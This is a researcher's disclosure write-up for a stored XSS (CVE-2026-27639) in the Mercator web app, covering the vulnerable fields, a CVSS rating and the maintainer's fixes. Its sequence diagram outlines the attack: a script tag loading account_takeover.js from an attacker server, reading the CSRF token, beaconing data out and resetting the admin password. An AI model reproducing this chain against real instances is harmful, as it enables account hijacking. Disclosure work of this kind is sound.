---
title: "CVE-2026-27639 Mercator : Account Takeover via Stored XSS"
date: 2026-02-21
draft: false
author: "Hadzah"
tags: ["cve", "xss", "account-takeover", "mercator"]
description: "CVE-2026-27639 Stored XSS to admin account takeover in Mercator"
---

## Description

A low-privileged user (with the `User` role) can achieve a **full administrator account takeover** on Mercator by injecting a malicious script into the `contact_point` field when creating an entity.
When an admin visits the entity listing page, the payload executes in their browser context, silently changing the admin password without any re-authentication.

| | |
|---|---|
| **Product** | [Mercator](https://github.com/dbarzin/mercator) |
| **Version** | <= 2026.03.01 |
| **Type** | [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html) |
| **CVSS 4.0** | **8.5** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |

### Prerequisites

- A valid account on the Mercator instance with the **User** role
- The `entity_create` permission (granted to all users by default)
- Network reachability between the victim's browser and the attacker's HTTP server (to serve the JS payload)

### Vulnerable fields

Three fields accept unsanitized input and are rendered with `{!! !!}`, but `contact_point` is the most impactful: it is the only one reflected in `index.blade.php` (the entity listing), meaning the payload triggers as soon as any admin visits `/admin/entities`, no need to open a specific entity.
The `description` field is also reflected in `ecosystem.blade.php`, but `entity_type` only appears in the detail view.

| Field | Validation | Rendered with `{!! !!}` | Exploitable |
|---|---|---|---|
| `contact_point` | None | `index.blade.php`, `_details.blade.php`, `edit.blade.php`, `create.blade.php`, `ecosystem.blade.php` | **Yes, highest impact** (reflected in entity listing) |
| `description` | None | `_details.blade.php`, `edit.blade.php`, `create.blade.php`, `ecosystem.blade.php` | **Yes**, detail + ecosystem report only |
| `entity_type` | None | `_details.blade.php` | **Yes** — detail view only |
| `security_level` | `integer` | `_details.blade.php`, `ecosystem.blade.php`, `edit.blade.php`, `create.blade.php` | No , type constraint blocks injection |

---

## Workflows

### Attack sequence

The following diagram shows the full attack flow from initial authentication to account takeover. The red zone highlights the phase where the malicious JavaScript executes automatically in the admin's browser, without any visible interaction.

{{< mermaid caption="Sequence diagram — Full attack chain from XSS injection to admin account takeover" >}}
sequenceDiagram
    actor Attacker as Attacker (User role)
    participant Server as Mercator Server
    participant DB as Database
    participant LHOST as Attacker HTTP Server
    actor Admin as Victim (Admin)

    Note over Attacker,Admin: Phase 1 — Attacker Authentication

    Attacker->>Server: POST /login (login, password)
    Server-->>Attacker: 302 → /admin (authenticated session)

    Note over Attacker,Admin: Phase 2 — XSS Injection (SOURCE)

    Attacker->>Server: GET /admin/entities/create
    Server-->>Attacker: Form + CSRF token
    Attacker->>Server: POST /admin/entities<br/>contact_point = script src=LHOST:LPORT/account_takeover.js
    Server->>DB: Entity::create($request->all())<br/>No sanitization on contact_point
    DB-->>Server: Entity stored (longText)
    Server-->>Attacker: 302 — Entity created

    Note over Attacker,Admin: Phase 3 — Admin triggers the payload (SINK)

    Admin->>Server: GET /admin/entities
    Server->>DB: SELECT * FROM entities
    DB-->>Server: Entities (including malicious contact_point)
    Server-->>Admin: HTML with {!! $entity->contact_point !!}<br/>(rendered without escaping)

    Note over Attacker,Admin: Phase 4 — JS execution in admin context

    Admin->>LHOST: GET /account_takeover.js
    LHOST-->>Admin: account_takeover.js (payload)

    rect rgba(242, 78, 78, 0.2)
        Note over Admin,Server: Automatic execution in admin browser
        Admin->>Admin: Read CSRF token from<br/>meta[name="csrf-token"]
        Admin->>LHOST: Beacon step=1 (csrf=found)
        Admin->>Server: GET /admin/users/{ADMIN_ID}/edit<br/>(credentials: include)
        Server-->>Admin: User form (login, name, email, roles)
        Admin->>LHOST: Beacon step=2b (login, roles)
        Admin->>Server: POST /admin/users/{ADMIN_ID}<br/>_method=PUT, _token, password=NEW_PASSWORD
        Server->>DB: UPDATE users SET password=... WHERE id=ADMIN_ID
        Server-->>Admin: 302 — 200 (password changed)
        Admin->>LHOST: Beacon step=3 (status=200)
    end

    Note over Attacker,Admin: Phase 5 — Account Takeover

    Attacker->>Server: POST /login (admin_login, NEW_PASSWORD)
    Server-->>Attacker: 302 → /admin (logged in as admin)
{{< /mermaid >}}

### Application file flow (source to sink)

This diagram maps the vulnerability across the Mercator codebase.
It traces user input from the route definition, through validation (where `contact_point` is not checked), into the controller that stores it raw in the database, and finally to the Blade views that render it without escaping.

{{< mermaid caption="State diagram — Vulnerability path through application files from input to unescaped rendering" >}}
stateDiagram-v2
    direction TB

    state "routes/web.php" as routes
    state "StoreEntityRequest.php" as validation
    state "EntityController.php" as controller
    state "Database — entities table" as db

    note right of routes
        POST /admin/entities
        Allows JS payload injection
        via contact_point field
    end note

    note right of validation
        name - validated
        iconFile - validated
        contact_point - NO RULE
        Malicious input passes through
    end note

    note right of controller
        store calls request all unfiltered
        Stores raw HTML/JS payload
        directly into the database
    end note

    note right of db
        contact_point stored as longText
        Payload persisted without
        any sanitization
    end note

    [*] --> routes : POST /admin/entities
    routes --> validation : StoreEntityRequest
    validation --> controller : unfiltered input
    controller --> db : INSERT contact_point
{{< /mermaid >}}

---

## Impact Details

The CVSS 4.0 vector for this vulnerability is:

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
```

| Metric | Value | Rationale |
|---|---|---|
| **Attack Vector (AV)** | Network | Exploitable remotely through the web interface |
| **Attack Complexity (AC)** | Low | No special conditions required beyond standard access |
| **Attack Requirements (AT)** | None | No additional prerequisites beyond a valid low-privilege account |
| **Privileges Required (PR)** | Low | Requires a User-level account with entity creation permission |
| **User Interaction (UI)** | Passive | The administrator must visit vulnerable pages. (routine action, no click required) |
| **Confidentiality (VC)** | High | Attacker gains full access to the admin account and all application data |
| **Integrity (VI)** | High | Attacker can modify any data, change passwords, alter configurations |
| **Availability (VA)** | None | No direct denial of service |
| **Subsequent Confidentiality (SC)** | None | Impact is contained within the Mercator application |
| **Subsequent Integrity (SI)** | None | No downstream system impact |
| **Subsequent Availability (SA)** | None | No downstream system impact |

Adding social engineering to make the XSS critical would, in my opinion, be too far-fetched. We would be leaving the context of exploitation due to human naivety and not via a second exploit.

The two operating scripts are available here : https://github.com/hadhub/CVE-2026-27639-Mercator-XSS

---

## Remedies

[Didier Barzin](https://github.com/dbarzin) fixed this vulnerability by applying several modifications to the Mercator code base in various places:

- **Input sanitization via FormRequest** : Integration of mews/purifier (HTMLPurifier) in a ``BaseFormRequest`` class. Plain-text fields will be processed with ``strip_tags()``, rich-text fields with ``Purifier::clean()`` using a restricted allow-list configuration.
- **Blade template correction** : Systematic replacement of ``{!! !!}`` with ``{{ }}`` for all fields that do not require HTML rendering.
- **Content Security Policy header** : A ``SecurityHeaders`` middleware will emit a CSP with per-request nonces on all responses, preventing injected scripts from executing even if they reach the browser.

More details : [https://github.com/dbarzin/mercator/security/advisories/GHSA-65p7-pph2-966g](https://github.com/dbarzin/mercator/security/advisories/GHSA-65p7-pph2-966g)

Thank you to him for the various exchanges we had by email. This application addresses many IT issues from the perspective of managing and understanding a modern and complex infrastructure.

Thank you for reading this article about my first vulnerability :)
